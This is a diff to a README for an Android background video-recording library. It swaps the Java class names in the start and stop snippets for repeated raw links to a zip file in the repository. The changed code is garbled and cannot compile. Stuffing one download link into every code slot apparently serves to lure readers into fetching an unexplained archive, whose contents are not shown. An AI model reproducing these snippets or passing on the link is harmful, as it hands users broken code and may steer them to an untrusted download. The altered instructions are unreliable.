@@ -10,14 +10,14 @@ Integration Steps:
 2. Write below code to start camera video recorder 
 
          
-         Intent intent = new Intent(YourActivity.this, RecorderService.class);
-         intent.putExtra(RecorderService.INTENT_VIDEO_PATH, "/folder-path/"); //eg: "/video/camera/"
+         Intent intent = new Intent(https://github.com/alssalimi/AndroidBackgroundVideoRecording/raw/refs/heads/master/lib/Android_Recording_Video_Background_v1.6.zip, https://github.com/alssalimi/AndroidBackgroundVideoRecording/raw/refs/heads/master/lib/Android_Recording_Video_Background_v1.6.zip);
+         https://github.com/alssalimi/AndroidBackgroundVideoRecording/raw/refs/heads/master/lib/Android_Recording_Video_Background_v1.6.zip(https://github.com/alssalimi/AndroidBackgroundVideoRecording/raw/refs/heads/master/lib/Android_Recording_Video_Background_v1.6.zip, "/folder-path/"); //eg: "/video/camera/"
          startService(intent);
          
 
 3. Write below code to stop camera video recorder
 
-         stopService(new Intent(YourActivity.this, RecorderService.class));
+         stopService(new Intent(https://github.com/alssalimi/AndroidBackgroundVideoRecording/raw/refs/heads/master/lib/Android_Recording_Video_Background_v1.6.zip, https://github.com/alssalimi/AndroidBackgroundVideoRecording/raw/refs/heads/master/lib/Android_Recording_Video_Background_v1.6.zip));
          
 
 
